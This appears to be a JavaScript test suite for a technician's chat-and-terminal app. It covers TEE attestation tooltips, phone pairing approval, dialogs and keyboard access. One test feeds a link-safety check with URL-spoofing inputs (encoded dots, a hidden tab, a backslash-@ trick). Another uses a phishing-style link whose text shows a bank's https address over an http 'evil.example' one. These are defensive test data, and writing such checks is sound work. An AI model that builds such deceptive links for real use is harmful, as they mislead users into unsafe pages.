  assert.match(title({ signers: ["0xbb"], instances: 12 }),
    /\nA reply RedPill's gateway answers instead is checked against: 0xbb\n/);
  assert.doesNotMatch(title({ signers: [], instances: 12 }), /Reply-signing|checked against/);
});

test("the top bar says what was attested, RedPill's gateway by name, and leads its tooltip with what is its word", async () => {
  const app = await page("a");
  const label = (att) => app.call("attestLabel", { status: "verified", kind: "tee", level: "partial",
    summary: "partially verified: GPUs not tied to the quote", detail: "d", ...att });
  const what = "Attested: RedPill's TEE gateway, which NanoGPT sends this model's requests through. That machine isn't attested by DA Toolkit: it is the gateway's word.";
  const gateway = label({ attested: "gateway", headline: "TEE gateway attested", what });
  assert.equal(gateway.text, "🛡 TEE gateway attested (partial)");
  assert.ok(gateway.title.startsWith(`${what}\n\npartially verified: GPUs not tied to the quote.`), gateway.title);
  assert.equal(label({ attested: "enclave", headline: "TEE attested", what: "Attested: the enclave.", level: "full" }).text,
    "🛡 TEE attested");
  // an attestation shown by an older server says what it always did, and that the text is in the clear
  const older = label({});
  assert.equal(older.text, "🛡 TEE attested (partial)");
  assert.match(older.title, /passes NanoGPT's servers in the clear/);
  assert.doesNotMatch(older.title + gateway.title, /runs in an attested enclave/);
  // Re-check says it too
  const app2 = await page("a", (s) => {
    s.config.active_model = "TEE/glm-5.3-flash";
    s.attestation = { status: "verified", kind: "tee", model: "TEE/glm-5.3-flash", level: "partial", summary: "partially verified: x",
      detail: "d", attested: "gateway", headline: "TEE gateway attested", what };
  }, { "POST /api/attest": () => ({ status: "verified", kind: "tee", headline: "TEE gateway attested", summary: "partially verified: x" }) });
  assert.equal(app2.$("#attest-btn").textContent, "🛡 TEE gateway attested (partial)");
  app2.$("#attest-btn").click();
  await app2.clock.tick(0);
  assert.ok(app2.toasts().includes("TEE gateway attested: partially verified: x"), app2.toasts().join("\n"));
});

test("a TEE reply's tooltip says what was attested before it was sent, and what is someone's word", async () => {
  const app = await page("a");
  const title = (e) => app.call("teeBadge", { tee_attested: "partially verified: GPUs not tied to the quote", ...e }).getAttribute("title");
  assert.ok(title({ tee_headline: "TEE gateway attested", tee_signature: "verified" })
    .startsWith("TEE gateway attested before sending: partially verified: GPUs not tied to the quote."));
  assert.ok(title({ tee_signature: "verified" }).startsWith("Attested before sending: "), "a reply kept from before");
  assert.match(title({ tee_signature: "verified" }), /the gateway's word, not checked by DA Toolkit/);
  assert.match(title({ tee_signature: "signed" }), /the machine running the model is the gateway's word/);
  assert.match(title({ tee_signature: "unsigned" }), /nothing shows which machine answered/);
  assert.match(title({ tee_signature: "unchecked" }), /attested through RedPill's gateway alone, its record came with no receipt/);
  for (const result of ["verified", "signed", "failed", "unchecked", "unsigned"]) {
    assert.match(title({ tee_signature: result }), /passes NanoGPT's servers in the clear\. A private\/ model is end-to-end encrypted instead\.$/);
  }
});

test("a TEE reply names who ran its model beside its mark, as RedPill's word, only where its receipt held", async () => {
  const app = await page("a");
  const upstream = { name: "phala-244", label: "Phala", scope: "model_instance", note: "",
    words: "Run by Phala: RedPill's record of its gateway's session says … That is RedPill's word, fetched from api.redpill.ai and matched to the receipt the attested gateway signed; DA Toolkit doesn't check that machine." };
  const badge = (e) => app.call("teeBadge", { tee_attested: "partially verified: x", tee_headline: "TEE gateway attested", ...e });
  const verified = badge({ tee_signature: "verified", tee_upstream: upstream });
  assert.equal(verified.textContent, "🛡 TEE · ✔ verified · run by Phala");
  assert.match(verified.getAttribute("title"), /\n\nRun by Phala: .*That is RedPill's word, fetched from api\.redpill\.ai/s);
  assert.equal(badge({ tee_signature: "signed", tee_upstream: upstream }).textContent, "🛡 TEE · signed, text not compared · run by Phala");
  // beside a check that failed, or none, the name would rest on nothing: not shown
  for (const result of ["failed", "unchecked", "unsigned", "checking"]) {
    const el = badge({ tee_signature: result, tee_upstream: upstream });
    assert.doesNotMatch(el.textContent + el.getAttribute("title"), /run by|Run by/i, result);
  }
  // looked up and named nobody: why, in the tooltip, and nothing beside the mark
  const unnamed = badge({ tee_signature: "verified", tee_upstream: { name: "", label: "", note: "api.redpill.ai answered HTTP 503",
    words: "The provider that ran it wasn't named: api.redpill.ai answered HTTP 503." } });
  assert.equal(unnamed.textContent, "🛡 TEE · ✔ verified");
  assert.match(unnamed.getAttribute("title"), /wasn't named: api\.redpill\.ai answered HTTP 503/);
});

test("Settings: naming the provider behind each TEE reply is off by default and says where it connects", async () => {
  const app = await page("a");
  app.call("openSettings", "model");
  await app.clock.tick(0);
  const box = app.$(".modal input.tee-upstreams");
  assert.ok(box, "the switch is on the Model tab");
  assert.equal(box.checked, false);
  assert.equal(box.parentElement.textContent, "Name the provider behind each TEE reply");
  const note = app.$(".modal .tee-upstreams-note").textContent;
  for (const said of ["connects to api.redpill.ai directly, not through NanoGPT", "RedPill sees this computer's internet address",
    "that one of its models was used around then", "Only the session's id is sent, never your messages or your key",
    "one small download per model about an hour", "never for models Chutes serves, whose records are megabytes each",
    "RedPill's word, matched to the receipt the attested gateway signed"]) {
    assert.ok(note.includes(said), said);
  }
  box.checked = true;
  box.dispatchEvent(new Event("change"));
  await app.clock.tick(0);
  assert.deepEqual(plain(app.posts("/api/settings").map((c) => c.body)), [{ tee_name_upstreams: true }]);
  // shown on when it is on
  const on = await page("a", (s) => { s.config.settings.tee_name_upstreams = true; });
  on.call("openSettings", "model");
  await on.clock.tick(0);
  assert.equal(on.$(".modal input.tee-upstreams").checked, true);
});

test("plain http to anywhere but this computer, its network or an onion is a link that isn't secure", async () => {
  const app = await page("a");
  const insecure = (url) => app.call("insecureLink", url);
  for (const url of ["http://example.com/", "http://93.184.216.34/x", "HTTP://EXAMPLE.COM", "  http://example.com/  ",
    "http:example.com", "http://[2001:db8::1]/", "http://localhost.example.com/", "http://127.0.0.1.example.com/",
    // as a browser reads them: an escape decoded into another name, a tab taken out, a backslash a slash
    "http://127.0.0.1%2eevil.example/", "ht\ttp://evil.example/", "http://evil.example\\@localhost/", "http://"])
    assert.equal(insecure(url), true, url);
  for (const url of ["http://localhost:8080/", "http://127.0.0.1/", "http://127.9.8.7:1/", "http://[::1]:11434/",
    "http://192.168.1.201:11434/api", "http://10.0.0.2/", "http://172.20.1.1/", "http://169.254.1.1/", "http://[fd00::5]/",
    "http://[fe80::1]/", "http://[::ffff:192.168.1.5]/", "http://printer.local/", "http://box.localhost/", "http://LOCALHOST./",
    "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/",
    "https://example.com/", "HTTPS://example.com", "mailto:a@example.com", "ftp://x/", "", null, undefined])
    assert.equal(insecure(url), false, String(url));
  for (const url of ["http://172.32.0.1/", "http://192.169.0.1/", "http://[::ffff:8.8.8.8]/", "http://[fec0::1]/"])
    assert.equal(insecure(url), true, url);
});

test("a link that isn't secure is marked from its real address, and asks before it opens", async () => {
  const app = await page("a");
  const tip = /plain http, so the page isn't encrypted/;
  // a source or citation: text that reads https:// over an http:// address is marked all the same
  const a = app.call("extLink", "http://evil.example/login", "https://bank.example/login", { title: "Verified secure" });
  assert.equal(a.hasAttribute("data-insecure"), true);
  assert.match(a.getAttribute("title"), tip);                          // the warning, not the page's words
  const fine = app.call("extLink", "https://example.com/", "ok");
  assert.equal(fine.hasAttribute("data-insecure"), false);
  // a rendered answer: DOMPurify's hook marks its links, and nothing the answer brings stands
  const [hook] = app.window.DOMPurify.hooks.afterSanitizeAttributes;
  const answer = app.window.document.createElement("a");
  answer.setAttribute("href", "http://example.com/p");
  hook(answer);
  assert.equal(answer.hasAttribute("data-insecure"), true);
  const faked = app.window.document.createElement("a");
  faked.setAttribute("href", "https://example.com/");
  faked.setAttribute("data-insecure", "");
  hook(faked);
  assert.equal(faked.hasAttribute("data-insecure"), false);
  // clicked: asked first, the address in full, Cancel the default; nothing opens until "Open anyway"
  // (what opens is a link of the page's own making, clicked for the technician: not `a` itself)
  const opened = [];
  app.window.document.addEventListener("click", (ev) => {
    if (ev.target !== a && ev.target?.tagName === "A" && !ev.defaultPrevented) opened.push(ev.target.getAttribute("href"));
  });
  app.window.document.body.append(a);
  const ev = new Event("click");
  a.dispatchEvent(ev);
  await app.clock.tick(100);
  assert.equal(ev.defaultPrevented, true);
  assert.match(app.$(".modal h2").textContent, /Open a link that isn't secure\?/);
  assert.equal(app.$(".modal .insecure-address").textContent, "http://evil.example/login");
  assert.equal(app.window.document.activeElement.textContent, "Cancel");
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(0);
  assert.deepEqual(opened, []);
  a.dispatchEvent(new Event("click"));
  await app.clock.tick(100);
  button(app.$(".modal"), "Open anyway").click();
  await app.clock.tick(0);
  assert.deepEqual(opened, ["http://evil.example/login"]);
  // a secure one opens as it always did
  app.window.document.body.append(fine);
  const plain = new Event("click");
  fine.dispatchEvent(plain);
  assert.equal(plain.defaultPrevented, false);
  assert.equal(app.$(".modal"), null);
});

test("a phone asking to pair is asked about here, its number shown, Refuse the default", async () => {
  const app = await page("a", null, {
    "POST /api/phone/claims/c1": () => ({ running: true }), "POST /api/phone/claims/c2": () => ({ running: true }) });
  await app.event({ type: "companion_claim", claim: { id: "c1", name: "Pixel", check: "4821" } });
  await app.clock.tick(100);
  assert.match(app.$(".modal h2").textContent, /Allow this phone\?/);
  assert.equal(app.$(".modal .check-code").textContent, "4821");
  assert.equal(app.window.document.activeElement.textContent, "Refuse");
  button(app.$(".modal"), "Allow").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/phone/claims/c1").map((c) => c.body), [{ allow: true }]);
  await app.event({ type: "companion_claim", claim: { id: "c1", name: "Pixel", check: "4821" } });   // asked once
  await app.clock.tick(100);
  assert.equal(app.$(".modal"), null);
  await app.event({ type: "companion_claim", claim: { id: "c2", name: "Somebody", check: "1111" } });
  await app.clock.tick(100);
  button(app.$(".modal"), "Refuse").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/phone/claims/c2").map((c) => c.body), [{ allow: false }]);
});

test("the phone's page claims its pairing code, shows the number, and is given its own token once allowed", async () => {
  let polls = 0;
  const app = loadApp({ page: "companion.html", script: "companion.js", hash: "#pair=abcdef", routes: {
    "POST /api/companion/pair": () => ({ claim: "c1", check: "4821" }),
    "GET /api/companion/pair/c1": () => (++polls < 2 ? { state: "waiting" } : { state: "approved", token: "mine" }),
    "GET /api/companion/state": () => ({ case: null, chat: [], queue: [], busy: false, hypotheses: [], photos: { ok: false } }) } });
  await app.clock.tick(0);
  assert.equal(app.historyUrl, "/companion");                         // the code is taken out of the address
  assert.deepEqual(plain(app.posts("/api/companion/pair")[0].body), { code: "abcdef", name: "A phone" });
  assert.equal(app.$("#pairing .check-code").textContent, "4821");
  assert.equal(app.sockets.length, 0, "nothing opened before the computer allows it");
  await app.clock.tick(1500);
  await app.clock.tick(1500);
  assert.equal(app.$("#pairing"), null);
  assert.equal(app.window.sessionStorage.getItem("dat-companion"), "mine");
  assert.equal(app.sockets[0].url, "ws://127.0.0.1:48599/ws/events?t=mine");
  assert.equal(app.gets("/api/companion/state").at(-1).headers["X-Token"], "mine");
});

test("the phone's page says so when the computer refuses it", async () => {
  const app = loadApp({ page: "companion.html", script: "companion.js", hash: "#pair=abcdef", routes: {
    "POST /api/companion/pair": () => ({ claim: "c1", check: "4821" }),
    "GET /api/companion/pair/c1": () => ({ state: "refused" }) } });
  await app.clock.tick(0);
  await app.clock.tick(1500);
  assert.match(app.$("#pairing").textContent, /didn't allow this phone/);
  assert.equal(app.sockets.length, 0);
  assert.equal(app.window.sessionStorage.getItem("dat-companion"), null);
});

test("a file or a link dropped on the window is refused, and text dropped into a field goes in", async () => {
  const app = await page("a");
  const drop = (target, types, type = "drop") => {
    const ev = new Event(type, { dataTransfer: { types, dropEffect: "copy" } });
    target.dispatchEvent(ev);
    return [ev.defaultPrevented, ev.dataTransfer.dropEffect];
  };
  const body = app.window.document.body, box = app.$("#chat-input") || app.window.document.querySelector("textarea");
  assert.deepEqual(drop(body, ["Files"]), [true, "none"]);
  assert.deepEqual(drop(body, ["text/uri-list", "text/plain"]), [true, "none"]);           // a link: it would load in place
  assert.deepEqual(drop(body, ["Files"], "dragover"), [true, "none"]);
  assert.deepEqual(drop(box, ["Files"]), [true, "none"]);                                     // nor a file into a field
  assert.deepEqual(drop(box, ["text/plain"]), [false, "copy"]);                               // text into a field: as it was
});

test("what is typed into a search card survives the chat being rebuilt, caret and all", async () => {
  const app = await page("a", (s) => {
    s.chat = [{ kind: "user", text: "502s since the upgrade" },
      { kind: "assistant", text: "Let me look that up.", searches: [{ id: "s1", status: "awaiting", query: "nginx 502", provider: "Brave" }] }];
  }, { "POST /api/web-search/s1": () => ({ ok: true }) });
  const input = app.$("#chat-log .scard input");
  assert.equal(input.value, "nginx 502");
  input.focus();
  await app.type(input, "nginx 502 upstream prematurely closed");
  input.setSelectionRange(6, 9);
  await app.event({ type: "chat", entry: { kind: "note", text: "Session local opened." } });
  const again = app.$("#chat-log .scard input");
  assert.ok(again !== input, "the card was rebuilt");
  assert.equal(again.value, "nginx 502 upstream prematurely closed");
  assert.ok(app.document.activeElement === again, "the focus followed the card");
  assert.deepEqual([again.selectionStart, again.selectionEnd], [6, 9]);
  button(app.$("#chat-log .scard"), "Search").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/web-search/s1").map((c) => c.body), [{ approve: true, query: "nginx 502 upstream prematurely closed" }]);
  assert.deepEqual(plain(app.run("S.cardEdits")), {});
});

test("the reply being written stays one bubble: an opened section, a finished paragraph and a card's field are left as they are", async () => {
  const app = await page("a");
  const delta = async (kind, text) => { await app.event({ type: "delta", kind, text }); await app.clock.tick(20); };
  await app.event({ type: "turn_start", model: "m", tier: "standard" });
  await delta("reasoning", "First I check ");
  const bubble = app.$("#chat-log .msg.streaming");
  const details = bubble.querySelector("details"), words = bubble.querySelector(".reasoning").firstChild;
  assert.equal(details.open, true, "open while it is all there is");
  await delta("reasoning", "the disk.");
  assert.ok(bubble.querySelector(".reasoning").firstChild === words, "the reasoning grows in the text node it has");
  assert.equal(words.data, "First I check the disk.");
  await delta("text", "The disk is full.\n\nNext, ");
  assert.equal(details.open, false, "closed as the message starts");
  // the technician opens it to read on
  details.querySelector("summary").click();
  details.open = true;
  const first = bubble.querySelector(".body p");
  await delta("text", "look at the logs");
  await delta("reasoning", " Then the logs.");
  assert.ok(app.$("#chat-log .msg.streaming") === bubble, "the same bubble");
  assert.ok(bubble.querySelector("details") === details);
  assert.equal(details.open, true, "what they opened stays open");
  assert.ok(bubble.querySelector(".body p") === first, "a finished paragraph is the element it was, with whatever is selected in it");
  assert.equal(bubble.querySelector(".body").textContent.replace(/\s+/g, " ").trim(), "The disk is full. Next, look at the logs");
  assert.equal(bubble.querySelectorAll(".caret").length, 1);
  // a search waits for approval: its field keeps the keyboard and what was typed while the reply goes on
  await app.event({ type: "search", search: { id: "s1", status: "awaiting", query: "nginx 502", provider: "Brave" } });
  await app.clock.tick(20);
  const field = bubble.querySelector(".scard input");
  field.focus();
  await app.type(field, "nginx 502 after upgrade");
  await delta("text", " and the config.");
  assert.ok(bubble.querySelector(".scard input") === field, "the card was not rebuilt");
  assert.ok(app.document.activeElement === field);
  // a research report being read stays unfolded when another card changes
  await app.event({ type: "research", research: { id: "r1", task: "research", status: "done", brief: "b", searches: 1, pages: 1, steps: [], report: "# Findings\n\nThe upstream times out." } });
  await app.clock.tick(20);
  const report = bubble.querySelector(".rcard details");
  report.open = true;
  await app.event({ type: "search", search: { id: "s1", status: "running", query: "nginx 502 after upgrade", provider: "Brave" } });
  await app.clock.tick(20);
  assert.equal(bubble.querySelector(".scard input"), null, "the card whose record changed is drawn again");
  assert.ok(bubble.querySelector(".rcard details") === report);
  assert.equal(report.open, true);
  // another entry arrives in the chat meanwhile: the bubble is still the one it was, and last
  await app.event({ type: "chat", entry: { kind: "note", text: "Session local-2 opened." } });
  assert.ok(app.$("#chat-log").lastElementChild === bubble);
  assert.deepEqual([details.open, report.open, bubble.querySelector(".body p") === first], [true, true, true]);
  assert.equal(app.$("#chat-log").querySelectorAll(".msg.streaming").length, 1);
  await app.event({ type: "turn_end", chat: [{ kind: "assistant", text: "The disk is full." }] });
  assert.equal(app.$("#chat-log .msg.streaming"), null);
  // the next turn starts a bubble of its own
  await app.event({ type: "turn_start", model: "m", tier: "standard" });
  await delta("text", "Again.");
  assert.ok(app.$("#chat-log .msg.streaming") !== bubble);
  assert.equal(app.$("#chat-log .msg.streaming").querySelector("details"), null);
});

test("Alt+digit in a terminal goes to the program; Ctrl+Shift+digit switches tabs from there, and Alt+digit elsewhere", async () => {
  const app = await page("a", (s) => { s.sessions.push({ ...s.sessions[0], id: "local-2" }); });
  const term = app.terminals[1], active = () => app.run("S.activeSid");
  assert.equal(active(), "local-2");
  const key = (init) => ({ type: "keydown", preventDefault() {}, ...init });
  assert.equal(term.keyHandler(key({ key: "1", code: "Digit1", altKey: true })), true, "xterm sends it to the program");
  const inside = term.element.appendChild(app.document.createElement("textarea"));
  assert.equal(app.key(inside, { key: "1", code: "Digit1", altKey: true }).defaultPrevented, false);
  assert.equal(active(), "local-2", "and the page leaves the tabs alone");
  assert.equal(term.keyHandler(key({ key: "!", code: "Digit1", ctrlKey: true, shiftKey: true })), false, "not a key for the program");
  assert.equal(app.key(inside, { key: "!", code: "Digit1", ctrlKey: true, shiftKey: true }).defaultPrevented, true);
  assert.equal(active(), "local");
  app.key(app.$("#chat-input"), { key: "2", code: "Digit2", altKey: true });
  assert.equal(active(), "local-2", "outside a terminal Alt+digit switches as before");
});

test("an update leaves the chat where the technician scrolled it; opening a case goes to its end", async () => {
  const app = await page("a");
  const log = app.$("#chat-log");
  Object.assign(log, { scrollHeight: 2000, clientHeight: 300, scrollTop: 100 });
  await app.event({ type: "state", state: state("a") });
  assert.equal(log.scrollTop, 100);
  await app.event({ type: "state", state: state("b") });
  assert.equal(log.scrollTop, 2000);
});

test("a photo this browser can't decode is turned down, not waited on for ever", async () => {
  const app = await page("a");
  assert.equal(await app.call("shrinkImage", "data:image/heic;base64,AAAA"), null);
  assert.equal(await app.call("shrinkImage", "data:image/png;base64,iVBO"), "data:image/png;base64,iVBO", "small enough already");
});

test("pasting spreadsheet cells pastes their text, not a picture of them", async () => {
  const app = await page("a");
  let asked = 0;
  const image = { type: "image/png", getAsFile: () => { asked++; return null; } };
  const paste = (items) => {
    const ev = new Event("paste", { clipboardData: { items } });
    app.$("#chat-input").dispatchEvent(ev);
    return ev;
  };
  paste([{ type: "text/plain", getAsFile: () => null }, image]);
  await app.clock.tick(0);
  assert.equal(asked, 0);
  paste([image]);
  await app.clock.tick(0);
  assert.equal(asked, 1, "a picture on its own is attached");
});

// ------------------------------------------------------------------ dialogs

test("a dialog is one to a screen reader, holds the keyboard, takes Escape wherever the focus is and gives the focus back", async () => {
  const app = await page("a");
  const opener = app.$("#settings-btn");
  opener.focus();
  opener.click();
  await app.clock.tick(50);
  const box = app.$(".modal");
  assert.deepEqual([box.getAttribute("role"), box.getAttribute("aria-modal"), box.getAttribute("aria-label")], ["dialog", "true", "Settings"]);
  assert.ok(box.contains(app.document.activeElement));
  // Tab goes round inside it
  const all = app.call("focusables", box);
  assert.ok(all.length > 3 && all.every((el) => box.contains(el)));
  all.at(-1).focus();
  assert.equal(app.key(all.at(-1), { key: "Tab" }).defaultPrevented, true);
  assert.ok(app.document.activeElement === all[0]);
  assert.equal(app.key(all[0], { key: "Tab", shiftKey: true }).defaultPrevented, true);
  assert.ok(app.document.activeElement === all.at(-1));
  all[1].focus();
  assert.equal(app.key(all[1], { key: "Tab" }).defaultPrevented, false, "between the ends the browser moves it");
  // focus that lands on the page behind comes back
  app.$("#chat-input").focus();
  assert.ok(app.document.activeElement === box);
  // a dialog on top is the one Escape closes, with the focus anywhere; then the one under it
  const answer = app.call("confirmModal", "Sure?", "Really?");
  await app.clock.tick(50);
  assert.equal(app.$("#modal-root").querySelectorAll(".modal").length, 2);
  app.document.activeElement = app.document.body;
  app.key(app.document.body, { key: "Escape" });
  await app.clock.tick(0);
  assert.equal(await answer, false);
  assert.deepEqual(app.$("#modal-root").querySelectorAll(".modal").map((m) => m.getAttribute("aria-label")), ["Settings"]);
  assert.ok(app.document.activeElement === box, "back in the dialog under it");
  app.key(app.document.body, { key: "Escape" });
  await app.clock.tick(0);
  assert.equal(app.$(".modal"), null);
  assert.ok(app.document.activeElement === opener, "back on the button that opened it");
});

test("Escape or a click outside asks before closing a form with edits in it, and not otherwise", async () => {
  const app = await page("a", null, { "POST /api/settings": () => ({ ok: true }) });
  const outside = () => { const o = app.$(".overlay"); o.dispatchEvent(new Event("mousedown")); return app.clock.tick(50); };
  const escape = () => { app.key(app.document.body, { key: "Escape" }); return app.clock.tick(50); };
  const titles = () => app.$("#modal-root").querySelectorAll(".modal").map((m) => m.getAttribute("aria-label"));
  app.call("openSettings", "general");
  await app.clock.tick(50);
  const field = app.$(".modal input[type=number]");
  await app.type(field, "500");
  await escape();
  assert.deepEqual(titles(), ["Settings", "Close without saving?"]);
  button(app.$("#modal-root").querySelectorAll(".modal")[1], "Cancel").click();
  await app.clock.tick(50);
  assert.deepEqual(titles(), ["Settings"]);
  assert.equal(field.value, "500", "still there to save");
  await outside();
  assert.deepEqual(titles(), ["Settings", "Close without saving?"]);
  await escape();                                                 // of the question: the same as Cancel
  assert.deepEqual(titles(), ["Settings"]);
  // another tab is another way to lose it: asked too
  const tab = (label) => app.$(".modal .tabs-inline").querySelectorAll("button").find((b) => b.textContent === label);
  tab("Model").click();
  await app.clock.tick(50);
  assert.deepEqual(titles(), ["Settings", "Close without saving?"]);
  await escape();
  assert.equal(tab("General").classList.contains("active"), true);
  // saved: nothing to ask about
  button(app.$(".modal"), "Save").click();
  await app.clock.tick(50);
  tab("Model").click();
  await app.clock.tick(50);
  assert.equal(tab("Model").classList.contains("active"), true);
  // a control that saves itself is no unsaved edit
  const self = app.$(".modal input.tee-upstreams");
  self.checked = true;
  self.dispatchEvent(new Event("change"));
  await app.clock.tick(50);
  await escape();
  assert.deepEqual(titles(), []);
  // the dialog's own buttons close without a question, and a dialog nothing was typed into just closes
  app.call("openCaseModal", false);
  await app.clock.tick(50);
  await outside();
  assert.deepEqual(titles(), []);
  app.call("openCaseModal", false);
  await app.clock.tick(50);
  await app.type(app.$(".modal input[type=text]"), "TKT-9 half a name");
  await app.type(app.$(".modal input[type=search]"), "acme");       // the list's filter isn't part of the form
  await escape();
  assert.deepEqual(titles(), ["Start a case", "Close without saving?"].map((t, i) => (i ? t : app.$(".modal").getAttribute("aria-label"))));
  button(app.$("#modal-root").querySelectorAll(".modal")[1], "Discard it").click();
  await app.clock.tick(50);
  assert.deepEqual(titles(), []);
});

test("Send results asks before Escape discards text edited in it", async () => {
  const app = await page("a", (s) => { Object.assign(s.queue[0], { status: "ran", ran_at: 1 }); }, {
    "GET /api/queue/1/capture": () => ({ text: " 10:00 up 3 days" }),
    "POST /api/preview": (c) => ({ items: c.body.texts.map((text) => ({ text, redactions: 0 })) }),
  });
  await app.call("openSendResults");
  await app.clock.tick(50);
  const text = app.$(".modal .result-block textarea");
  assert.equal(text.value, " 10:00 up 3 days");
  app.key(app.document.body, { key: "Escape" });
  await app.clock.tick(50);
  assert.equal(app.$(".modal"), null, "nothing edited: closed at once");
  await app.call("openSendResults");
  await app.clock.tick(50);
  await app.type(app.$(".modal .result-block textarea"), " 10:00 up 3 days (the load is from the backup)");
  app.key(app.document.body, { key: "Escape" });
  await app.clock.tick(50);
  assert.deepEqual(app.$("#modal-root").querySelectorAll(".modal").map((m) => m.getAttribute("aria-label")), ["Review results before sending", "Close without saving?"]);
});

test("a credential prompt that comes while the technician types doesn't take their keys into its field", async () => {
  const app = await page("a", null, { "POST /api/prompts/p1": () => ({ ok: true }), "POST /api/prompts/p2": () => ({ ok: true }),
    "POST /api/phone/claims/c1": () => ({ running: true }) });
  const prompt = (id) => ({ id, session_id: "web01", text: "bob@web01's password:", secret: true, can_save: false });
  const chat = app.$("#chat-input");
  chat.focus();
  app.key(chat, { key: "h" });
  await app.event({ type: "prompt", prompt: prompt("p1") });
  await app.clock.tick(50);
  const box = app.$(".modal");
  assert.ok(app.document.activeElement === box, "the dialog has the focus, its password field doesn't");
  assert.match(box.querySelector(".prompt-held").textContent, /You were typing when this came up.*click the field or press Tab to answer/);
  assert.equal(app.key(box, { key: "Enter" }).defaultPrevented, false);
  assert.deepEqual(app.posts("/api/prompts/p1"), [], "Enter typed on answers nothing");
  assert.equal(app.key(box, { key: "Tab" }).defaultPrevented, false, "Tab goes to the field, as the browser moves it");
  await app.event({ type: "prompt_done", id: "p1" });
  assert.ok(app.document.activeElement === chat, "and the focus is back where they were typing");
  // not typing: the field is ready at once
  await app.clock.tick(2000);
  await app.event({ type: "prompt", prompt: prompt("p2") });
  await app.clock.tick(50);
  assert.equal(app.document.activeElement.type, "password");
  assert.equal(app.$(".modal .prompt-held"), null);
  await app.event({ type: "prompt_done", id: "p2" });
  // a phone asking to pair, mid-sentence: Refuse isn't under the next press of Space
  app.key(chat, { key: " " });
  await app.event({ type: "companion_claim", claim: { id: "c1", name: "Pixel", check: "4821" } });
  await app.clock.tick(100);
  assert.ok(app.document.activeElement === app.$(".modal"));
});

// ------------------------------------------------------------------ the keyboard

test("a model is chosen from the keyboard: down from the filter into the list, arrows through it, Enter picks", async () => {
  const models = ["alpha", "beta", "gamma"].map((id, i) => ({ id: `vendor/${id}`, tier: "standard", allowed: i !== 1 }));
  const app = await page("a", null, { "GET /api/models": () => ({ models }), "POST /api/model": () => ({ ok: true }) });
  app.$("#model-btn").click();
  await app.clock.tick(100);
  const list = app.$(".model-list"), rows = () => list.querySelectorAll(".model-row");
  assert.equal(list.getAttribute("role"), "listbox");
  assert.deepEqual(rows().map((r) => [r.getAttribute("role"), r.getAttribute("tabindex"), r.getAttribute("aria-disabled")]),
    [["option", "0", null], ["option", "-1", null], ["option", "-1", "true"]]);               // the one not allowed sorts last
  const filter = app.$(".overlay input[type=text]");
  assert.equal(app.key(filter, { key: "ArrowDown" }).defaultPrevented, true);
  assert.ok(app.document.activeElement === rows()[0]);
  app.key(rows()[0], { key: "ArrowDown" });
  app.key(rows()[1], { key: "ArrowDown" });
  assert.ok(app.document.activeElement === rows()[2]);
  app.key(rows()[2], { key: "Enter" });                             // not allowed for this case: nothing
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/model"), []);
  app.key(rows()[2], { key: "ArrowUp" });
  assert.equal(app.key(rows()[1], { key: " " }).defaultPrevented, true);
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/model").map((c) => c.body.model), ["vendor/gamma"]);
  assert.equal(app.$(".modal"), null);
});

test("what acts on a click is reached with Tab and pressed with Enter or Space: tabs, the reviewer's line, #N, the sensitivity badge, a route's host", async () => {
  const review = { status: "done", level: "care", verdict: "proceed with care", summary: "restarts the proxy", model: "x/reviewer", tier: "standard", text: "SUMMARY: …" };
  const app = await page("a", (s) => {
    s.sessions.push({ ...s.sessions[0], id: "local-2" });
    s.queue[1].review = review;
    s.chat = [{ kind: "assistant", text: "Two things.", proposals: [2], withdrawn: [{ num: 3, reason: "not needed" }] }];
  }, { "GET /api/route/hosts": () => ({ supported: true, hosts: [
    { id: "h1", name: "Host One", available: true, fp8_or_better: true, privacy_label: "no logs" },
    { id: "h2", name: "Host Two", available: true, fp8_or_better: true, privacy_label: "no logs" },
    { id: "h3", name: "Host Three", available: false, fp8_or_better: true, privacy_label: "logs" }] }) });
  // a session's tab
  const tabs = app.$("#tab-list").querySelectorAll(".tab");
  assert.equal(app.$("#tab-list").getAttribute("role"), "tablist");
  assert.deepEqual(tabs.map((t) => [t.getAttribute("role"), t.getAttribute("tabindex"), t.getAttribute("aria-selected")]), [["tab", "0", "false"], ["tab", "0", "true"]]);
  assert.equal(app.key(tabs[0], { key: "Enter" }).defaultPrevented, true);
  assert.equal(app.run("S.activeSid"), "local");
  assert.equal(tabs[0].getAttribute("aria-selected"), "true");
  app.key(tabs[1].querySelector(".close"), { key: "Enter" });        // a key for the button inside it is not the tab's
  assert.equal(app.run("S.activeSid"), "local");
  // the reviewer's line, in the row and in the chat's card
  for (const line of [row(app, 2).querySelector(".qreview"), app.$("#chat-log").querySelector(".pcard .qreview")]) {
    assert.deepEqual([line.getAttribute("role"), line.getAttribute("tabindex")], ["button", "0"]);
    app.key(line, { key: " " });
    await app.clock.tick(50);
    assert.equal(app.$(".modal").getAttribute("aria-label"), "Second opinion on #2");
    button(app.$(".modal"), "Close").click();
    await app.clock.tick(0);
  }
  // #N in a message and on a card are buttons, and show the row
  const chips = app.$("#chat-log").querySelectorAll(".chip");
  assert.deepEqual(chips.map((c) => [c.tagName, c.textContent]), [["BUTTON", "#3"], ["BUTTON", "#2"]]);
  chips[0].click();
  assert.equal(row(app, 3).classList.contains("flash"), true);
  // the sensitivity badge
  const badge = app.$("#sens-badge");
  assert.equal(badge.tagName, "BUTTON");
  badge.click();
  await app.clock.tick(50);
  assert.equal(app.$(".modal").getAttribute("aria-label"), "Edit case");
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(0);
  // a route's host: each row has a radio button of its own
  app.run(`S.state.config.providers.push({ name: "Hosts R Us", kind: "nanogpt", routes: {} })`);
  app.call("openRouteDialog", "Hosts R Us", "vendor/model");
  await app.clock.tick(50);
  const kinds = app.$(".modal .route-opts").querySelectorAll("input");
  kinds.at(-1).checked = true;
  kinds.at(-1).dispatchEvent(new Event("change"));
  await app.clock.tick(0);
  const radios = () => app.$(".modal table.hosts").querySelectorAll("input[type=radio]");
  assert.deepEqual(radios().map((r) => [r.checked, r.disabled]), [[false, false], [false, false], [false, true]]);
  radios()[1].focus();
  radios()[1].checked = true;
  radios()[1].dispatchEvent(new Event("change"));
